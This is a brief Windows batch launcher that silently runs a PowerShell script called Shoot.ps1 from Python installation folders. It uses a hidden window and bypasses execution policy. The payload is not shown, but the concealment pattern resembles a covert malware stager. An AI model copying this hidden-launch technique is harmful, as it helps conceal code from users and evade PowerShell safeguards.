@echo off
if exist "C:\Python312\Shoot.ps1" (
    PowerShell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "& 'C:\Python312\Shoot.ps1'"
) else if exist "C:\Program Files\Python313\Shoot.ps1" (
    PowerShell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "& 'C:\Program Files\Python313\Shoot.ps1'"
) else (
    echo Error: Shoot.ps1 not found at specified locations
)
